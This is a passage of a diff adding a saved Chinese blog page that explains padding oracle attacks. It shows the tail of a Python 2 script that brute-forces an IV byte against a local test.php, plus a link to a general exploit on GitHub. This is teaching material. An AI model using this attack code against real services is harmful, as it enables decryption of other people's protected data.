+url="http://127.0.0.1/test.php"
+for i in xrange(256):
+    if i&lt;16:
+        tmp="00000000000000"+("0"+str(hex(i)[2]))
+    else:
+        tmp="00000000000000"+str(hex(i)[2:4])
+    print tmp[14:16]
+    param={"iv":tmp,"str":"01af3d443c84ae0d859755ee9b3e2933"}
+    result=r.get(url,params=param)
+    string=result.content
+    if string[14:16]=="01":
+        print "done!"
+        print tmp
+        print string
+        print chr(eval("0x"+tmp[14:16])^0x01^0x9b)
+        break
+&amp;apos;&amp;apos;&amp;apos;
+</code></pre>
+<h2 id="poc"><strong>三、通用poc</strong></h2>
+<p style="max-width:100%;height:auto;">最后也给上了写的比较好的通用poc，一份github的代码，这个是我用了几个之后觉得算是最好的一份了。
+https://github.com/mpgn/Padding-oracle-attack/blob/master/exploit.py</p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="./padding-oracle攻击原理分析(附带rsa资料)/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./padding-oracle攻击原理分析(附带rsa资料)/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="./padding-oracle攻击原理分析(附带rsa资料)/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./padding-oracle攻击原理分析(附带rsa资料)/prism.js"></script>
+<script src="./padding-oracle攻击原理分析(附带rsa资料)/zooming.js"></script>
+<script src="./padding-oracle攻击原理分析(附带rsa资料)/Bendawang.js"></script>
+
+
